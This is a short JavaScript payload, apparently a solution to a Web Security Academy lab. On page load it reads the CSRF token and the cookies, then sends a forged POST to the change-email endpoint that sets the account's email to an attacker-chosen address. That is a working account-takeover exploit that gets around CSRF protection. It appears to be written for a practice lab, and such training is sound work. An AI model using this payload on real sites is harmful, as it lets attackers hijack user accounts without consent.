
// wait for DOM to load to capture csrf token
window.addEventListener('DOMContentLoaded', function(){
    // Extract csrf token
    const csrfToken = document.getElementsByName("csrf")[0].value;

    // Extract cookie value
    const cookieValue = document.cookie;
    
    // POST request body
    const postData = new URLSearchParams({
        email: 'ibrahim@gmail.com',
        csrf: csrfToken
    });
    
    // Making the POST request to the change-email endpoint with the content of the body
    fetch('https://0af700770335f949823d561a006000eb.web-security-academy.net/my-account/change-email', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded', 
            'Cookie': cookieValue,
        },
        body: postData,
    });
})

